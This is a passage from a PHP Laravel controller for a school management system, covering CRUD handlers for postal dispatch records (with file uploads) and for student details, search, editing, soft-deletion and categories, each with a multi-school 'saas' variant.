                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_dispatch = new AramiscPostalDispatch();
            $postal_dispatch->from_title = $request->from_title;
            $postal_dispatch->reference_no = $request->reference_no;
            $postal_dispatch->address = $request->address;
            $postal_dispatch->date = date('Y-m-d', strtotime($request->date));
            $postal_dispatch->note = $request->note;
            $postal_dispatch->to_title = $request->to_title;
            $postal_dispatch->file = $fileName;
            $postal_dispatch->school_id = $request->school_id;
            $result = $postal_dispatch->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal dispatch has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');

                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_dispatch_show(Request $request, $id)
    {

        try {
            $postal_dispatchs = AramiscPostalDispatch::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $postal_dispatch = AramiscPostalDispatch::find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['postal_dispatchs'] = $postal_dispatchs->toArray();
                $data['postal_dispatch'] = $postal_dispatch->toArray();

                return ApiBaseMethod::sendResponse($data, 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_dispatch', compact('postal_dispatchs', 'postal_dispatch'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_dispatch_show(Request $request,$school_id, $id)
    {

        try {
            $postal_dispatchs = AramiscPostalDispatch::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $postal_dispatch = AramiscPostalDispatch::where('school_id',$school_id)->find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['postal_dispatchs'] = $postal_dispatchs->toArray();
                $data['postal_dispatch'] = $postal_dispatch->toArray();

                return ApiBaseMethod::sendResponse($data, 'Postal retrieved successfully.');
            }
            return view('backEnd.admin.postal_dispatch', compact('postal_dispatchs', 'postal_dispatch'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_dispatch_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {
                $postal_dispatch = AramiscPostalDispatch::find($request->id);
                if ($postal_dispatch->file != "") {
                    if (file_exists($postal_dispatch->file)) {
                        unlink($postal_dispatch->file);
                    }
                }

                $file = $request->file('file');
                $fileName = 'dis' . md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_dispatch = AramiscPostalDispatch::find($request->id);
            $postal_dispatch->from_title = $request->from_title;
            $postal_dispatch->reference_no = $request->reference_no;
            $postal_dispatch->address = $request->address;
            $postal_dispatch->date = date('Y-m-d', strtotime($request->date));
            $postal_dispatch->note = $request->note;
            $postal_dispatch->to_title = $request->to_title;
            if ($fileName != "") {
                $postal_dispatch->file = $fileName;
            }
            $result = $postal_dispatch->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('postal-dispatch');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_dispatch_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'from_title' => "required|max:250",
            'reference_no' => "required|max:150",
            'address' => "required|max:250",
            'to_title' => "required|max:250",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {
                $postal_dispatch = AramiscPostalDispatch::find($request->id);
                if ($postal_dispatch->file != "") {
                    if (file_exists($postal_dispatch->file)) {
                        unlink($postal_dispatch->file);
                    }
                }

                $file = $request->file('file');
                $fileName = 'dis' . md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/postal/', $fileName);
                $fileName =  'public/uploads/postal/' . $fileName;
            }


            $postal_dispatch = AramiscPostalDispatch::find($request->id);
            $postal_dispatch->from_title = $request->from_title;
            $postal_dispatch->reference_no = $request->reference_no;
            $postal_dispatch->address = $request->address;
            $postal_dispatch->date = date('Y-m-d', strtotime($request->date));
            $postal_dispatch->note = $request->note;
            $postal_dispatch->to_title = $request->to_title;
            $postal_dispatch->school_id = $request->school_id;
            if ($fileName != "") {
                $postal_dispatch->file = $fileName;
            }
            $result = $postal_dispatch->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('postal-dispatch');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function postal_dispatch_destroy(Request $request, $id)
    {

        try {
            $postal_dispatch = AramiscPostalDispatch::find($id);
            if ($postal_dispatch->file != "") {
                if (file_exists($postal_dispatch->file)) {
                    unlink($postal_dispatch->file);
                }
            }
            $result = $postal_dispatch->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal dispatch has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('postal-dispatch');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_postal_dispatch_destroy(Request $request,$school_id, $id)
    {

        try {
            $postal_dispatch = AramiscPostalDispatch::where('school_id',$school_id)->find($id);
            if ($postal_dispatch->file != "") {
                if (file_exists($postal_dispatch->file)) {
                    unlink($postal_dispatch->file);
                }
            }
            $result = $postal_dispatch->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Postal dispatch has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('postal-dispatch');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function setup_admin_destroy(Request $request, $id)
    {


        try {

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($request) {
                    return ApiBaseMethod::sendResponse(null, 'Admin Setup can not delete');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($request) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('setup-admin');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function studentDetails(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $student_list = DB::table('aramisc_students')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_list'] = $student_list->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $academic_years = AramiscAcademicYear::latest()->get();
            return view('backEnd.studentInformation.student_details', compact('students', 'classes', 'academic_years'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentDetails(Request $request,$school_id)
    {
        try {
            $classes = AramiscClass::withoutGlobalScope(StatusAcademicSchoolScope::class)->where('active_status', 1)->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))->where('school_id',$school_id)->get();
            $student_list = DB::table('aramisc_students')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))
                ->where('aramisc_students.school_id',$school_id)
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_list'] = $student_list->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $academic_years = AramiscAcademicYear::where('school_id',$school_id)->latest()->get();
            return view('backEnd.studentInformation.student_details', compact('students', 'classes', 'academic_years'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentDetailsSearch(Request $request)
    {
        $request->validate([
            'class' => 'required',
        ]);
        try {
            $students = AramiscStudent::query();
            $students->where('active_status', 1);
            if ($request->class != "") {
                $students->where('class_id', $request->class);
            }
            if ($request->section != "") {
                $students->where('section_id', $request->section);
            }
            if ($request->name != "") {
                $students->where('full_name', 'like', '%' . $request->name . '%');
            }
            if ($request->roll_no != "") {
                $students->where('roll_no', 'like', '%' . $request->roll_no . '%');
            }


            $students = $students->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();


            $class_id = $request->class;
            $name = $request->name;
            $roll_no = $request->roll_no;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                $data['name'] = $name;
                $data['roll_no'] = $roll_no;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_details', compact('students', 'classes', 'class_id', 'name', 'roll_no'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_search_Details(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $student_list = DB::table('aramisc_students')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_list'] = $student_list->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $academic_years = AramiscAcademicYear::latest()->get();
            return view('backEnd.studentInformation.student_details', compact('students', 'classes', 'academic_years'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_search_Details(Request $request,$school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $student_list = DB::table('aramisc_students')
                ->join('aramisc_classes', 'aramisc_students.class_id', '=', 'aramisc_classes.id')
                ->join('aramisc_sections', 'aramisc_students.section_id', '=', 'aramisc_sections.id')
                ->where('aramisc_students.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->where('aramisc_students.school_id',$school_id)
                ->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_list'] = $student_list->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Exception $e) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $e);
            }
        }
    }
    public function studentView(Request $request, $id)
    {
        try {
            $student_detail = AramiscStudent::find($id);

            $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)
                ->where('active_status', 1)

                ->where('id', '!=', $student_detail->id)
                ->get();

            $vehicle = DB::table('aramisc_vehicles')->where('id', $student_detail->vehicle_id)->first();

            $fees_assigneds = AramiscFeesAssign::where('student_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $documents = AramiscStudentDocument::where('student_staff_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $timelines = AramiscStudentTimeline::where('staff_student_id', $id)->where('type', 'stu')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exams = AramiscExamSchedule::where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->get();
            $academic_year = AramiscAcademicYear::where('id', $student_detail->session_id)->first();
            $grades = AramiscMarksGrade::where('active_status', 1)->get();
            if (!empty($student_detail->vechile_id)) {
                $driver_id = AramiscVehicle::where('id', '=', $student_detail->vechile_id)->first();
                $driver_info = AramiscStaff::where('id', '=', $driver_id->driver_id)->first();
            } else {
                $driver_id = '';
                $driver_info = '';
            }



            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_detail'] = $student_detail->toArray();
                $data['fees_assigneds'] = $fees_assigneds->toArray();
                $data['fees_discounts'] = $fees_discounts->toArray();
                $data['exams'] = $exams->toArray();
                $data['documents'] = $documents->toArray();
                $data['timelines'] = $timelines->toArray();
                $data['siblings'] = $siblings->toArray();
                $data['grades'] = $grades->toArray();
                $data['driver_info'] = $driver_info->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_view', compact('student_detail', 'driver_info', 'fees_assigneds', 'fees_discounts', 'exams', 'documents', 'timelines', 'siblings', 'grades', 'academic_year'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentView(Request $request,$school_id, $id)
    {
        try {
            $student_detail = AramiscStudent::where('school_id',$school_id)->find($id);

            $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)
                ->where('active_status', 1)

                ->where('id', '!=', $student_detail->id)
                ->where('school_id',$school_id)
                ->get();

            $vehicle = DB::table('aramisc_vehicles')->where('id', $student_detail->vehicle_id)->where('school_id',$school_id)->first();

            $fees_assigneds = AramiscFeesAssign::where('student_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $documents = AramiscStudentDocument::where('student_staff_id', $id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $timelines = AramiscStudentTimeline::where('staff_student_id', $id)->where('type', 'stu')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $exams = AramiscExamSchedule::where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->where('school_id',$school_id)->get();
            $academic_year = AramiscAcademicYear::where('id', $student_detail->session_id)->where('school_id',$school_id)->first();
            $grades = AramiscMarksGrade::where('active_status', 1)->get();
            if (!empty($student_detail->vechile_id)) {
                $driver_id = AramiscVehicle::where('id', '=', $student_detail->vechile_id)->where('school_id',$school_id)->first();
                $driver_info = AramiscStaff::where('id', '=', $driver_id->driver_id)->where('school_id',$school_id)->first();
            } else {
                $driver_id = '';
                $driver_info = '';
            }



            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_detail'] = $student_detail->toArray();
                $data['fees_assigneds'] = $fees_assigneds->toArray();
                $data['fees_discounts'] = $fees_discounts->toArray();
                $data['exams'] = $exams->toArray();
                $data['documents'] = $documents->toArray();
                $data['timelines'] = $timelines->toArray();
                $data['siblings'] = $siblings->toArray();
                $data['grades'] = $grades->toArray();
                $data['driver_info'] = $driver_info->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.studentInformation.student_view', compact('student_detail', 'driver_info', 'fees_assigneds', 'fees_discounts', 'exams', 'documents', 'timelines', 'siblings', 'grades', 'academic_year'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentDelete(Request $request)
    {

        $student_detail = AramiscStudent::find($request->id);
        $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)->get();

        DB::beginTransaction();

        $tables = \App\tableList::getTableList('student_id',$request->id);
        try {

            if (!$tables) {

                try {

                    $student = AramiscStudent::find($request->id);
                    $student->active_status = 0;
                    $student->save();

                    try {
                        if (count($siblings) == 1) {
                            $parent = AramiscParent::find($student_detail->parent_id);
                            $parent->active_status = 0;
                            $parent->save();
                        }
                        try {

                            $student_user = User::find($student_detail->user_id);
                            $student_user->active_status = 0;
                            $student_user->save();

                            try {

                                if (count($siblings) == 1) {
                                    $parent_user = User::find($student_detail->parents->user_id);
                                    $parent_user->active_status = 0;
                                    $parent_user->save();
                                }


                                DB::commit();

                                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                    return ApiBaseMethod::sendResponse(null, 'Student has been deleted successfully');
                                }
                                Toastr::success('Operation successful', 'Success');
                                return redirect()->back();
                            } catch (\Exception $e) {
                                DB::rollback();

                                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                                }
                                Toastr::error('Operation Failed', 'Failed');
                                return redirect()->back();
                            }
                        } catch (\Exception $e) {
                            DB::rollback();

                            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                return ApiBaseMethod::sendError('Something went wrong, please try again');
                            }
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    } catch (\Exception $e) {
                        DB::rollback();

                        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                            return ApiBaseMethod::sendError('Something went wrong, please try again');
                        }
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                } catch (\Exception $e) {
                    DB::rollback();

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse($student_detail, null);
                }
                return view('backEnd.studentInformation.student_details', compact('student_detail'));
            } else {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Illuminate\Database\QueryException $e) {

            $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError($msg);
            }
            Toastr::error('This item already used', 'Failed');
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentDelete(Request $request,$school_id)
    {

        $student_detail = AramiscStudent::where('school_id',$school_id)->find($request->id);
        $siblings = AramiscStudent::where('parent_id', $student_detail->parent_id)->where('school_id',$school_id)->get();

        DB::beginTransaction();

        $tables = \App\tableList::getTableList('student_id',$request->id);
        try {


            if (!$tables) {

                try {

                    $student = AramiscStudent::where('school_id',$school_id)->find($request->id);
                    $student->active_status = 0;
                    $student->save();

                    try {
                        if (count($siblings) == 1) {
                            $parent = AramiscParent::where('school_id',$school_id)->find($student_detail->parent_id);
                            $parent->active_status = 0;
                            $parent->save();
                        }
                        try {

                            $student_user = User::where('school_id',$school_id)->find($student_detail->user_id);
                            $student_user->active_status = 0;
                            $student_user->save();

                            try {

                                if (count($siblings) == 1) {
                                    $parent_user = User::where('school_id',$school_id)->find($student_detail->parents->user_id);
                                    $parent_user->active_status = 0;
                                    $parent_user->save();
                                }


                                DB::commit();

                                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                    return ApiBaseMethod::sendResponse(null, 'Student has been deleted successfully');
                                }
                                Toastr::success('Operation successful', 'Success');
                                return redirect()->back();
                            } catch (\Exception $e) {
                                DB::rollback();

                                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                                }
                                Toastr::error('Operation Failed', 'Failed');
                                return redirect()->back();
                            }
                        } catch (\Exception $e) {
                            DB::rollback();

                            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                                return ApiBaseMethod::sendError('Something went wrong, please try again');
                            }
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    } catch (\Exception $e) {
                        DB::rollback();

                        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                            return ApiBaseMethod::sendError('Something went wrong, please try again');
                        }
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                } catch (\Exception $e) {
                    DB::rollback();

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Something went wrong, please try again');
                    }
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse($student_detail, null);
                }
                return view('backEnd.studentInformation.student_details', compact('student_detail'));
            } else {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Illuminate\Database\QueryException $e) {

            $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError($msg);
            }
            Toastr::error('This item already used', 'Failed');
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentEdit(Request $request, $id)
    {
        try {
            $student = AramiscStudent::find($id);
            $classes = AramiscClass::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $sections = AramiscSection::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $religions = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '2')->get();
            $blood_groups = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '3')->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->get();
            $route_lists = AramiscRoute::where('active_status', '=', '1')->get();
            $vehicles = AramiscVehicle::where('active_status', '=', '1')->get();
            $dormitory_lists = AramiscDormitoryList::where('active_status', '=', '1')->get();
            $driver_lists = AramiscStaff::where([['active_status', '=', '1'], ['role_id', 9]])->get();
            $categories = AramiscStudentCategory::all();
            $sessions = AramiscAcademicYear::where('active_status', '=', '1')->get();
            $siblings = AramiscStudent::where('parent_id', $student->parent_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student'] = $student;
                $data['classes'] = $classes->toArray();
                $data['religions'] = $religions->toArray();
                $data['blood_groups'] = $blood_groups->toArray();
                $data['genders'] = $genders->toArray();
                $data['route_lists'] = $route_lists->toArray();
                $data['vehicles'] = $vehicles->toArray();
                $data['dormitory_lists'] = $dormitory_lists->toArray();
                $data['categories'] = $categories->toArray();
                $data['sessions'] = $sessions->toArray();
                $data['siblings'] = $siblings->toArray();
                $data['driver_lists'] = $driver_lists->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_edit', compact('student', 'classes', 'sections', 'religions', 'blood_groups', 'genders', 'route_lists', 'vehicles', 'dormitory_lists', 'categories', 'sessions', 'siblings', 'driver_lists'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentEdit(Request $request,$school_id, $id)
    {
        try {
            $student = AramiscStudent::where('school_id',$school_id)->find($id);
            $classes = AramiscClass::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $sections = AramiscSection::where('active_status', '=', '1')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            $religions = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '2')->where('school_id',$school_id)->get();
            $blood_groups = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '3')->where('school_id',$school_id)->get();
            $genders = AramiscBaseSetup::where('active_status', '=', '1')->where('base_group_id', '=', '1')->where('school_id',$school_id)->get();
            $route_lists = AramiscRoute::where('active_status', '=', '1')->where('school_id',$school_id)->get();
            $vehicles = AramiscVehicle::where('active_status', '=', '1')->where('school_id',$school_id)->get();
            $dormitory_lists = AramiscDormitoryList::where('active_status', '=', '1')->where('school_id',$school_id)->get();
            $driver_lists = AramiscStaff::where([['active_status', '=', '1'], ['role_id', 9]])->where('school_id',$school_id)->get();
            $categories = AramiscStudentCategory::all();
            $sessions = AramiscAcademicYear::where('active_status', '=', '1')->where('school_id',$school_id)->get();
            $siblings = AramiscStudent::where('parent_id', $student->parent_id)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student'] = $student;
                $data['classes'] = $classes->toArray();
                $data['religions'] = $religions->toArray();
                $data['blood_groups'] = $blood_groups->toArray();
                $data['genders'] = $genders->toArray();
                $data['route_lists'] = $route_lists->toArray();
                $data['vehicles'] = $vehicles->toArray();
                $data['dormitory_lists'] = $dormitory_lists->toArray();
                $data['categories'] = $categories->toArray();
                $data['sessions'] = $sessions->toArray();
                $data['siblings'] = $siblings->toArray();
                $data['driver_lists'] = $driver_lists->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_edit', compact('student', 'classes', 'sections', 'religions', 'blood_groups', 'genders', 'route_lists', 'vehicles', 'dormitory_lists', 'categories', 'sessions', 'siblings', 'driver_lists'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }


    public function student_type_index(Request $request)
    {

        try {

            $student_types = AramiscStudentCategory::get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($student_types, null);
            }

            return view('backEnd.studentInformation.student_category', compact('student_types'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_type_index(Request $request,$school_id)
    {

        try {

            $student_types = AramiscStudentCategory::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($student_types, null);
            }

            return view('backEnd.studentInformation.student_category', compact('student_types'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_type_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'category' => 'required|unique:aramisc_student_categories,category_name|max:50',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
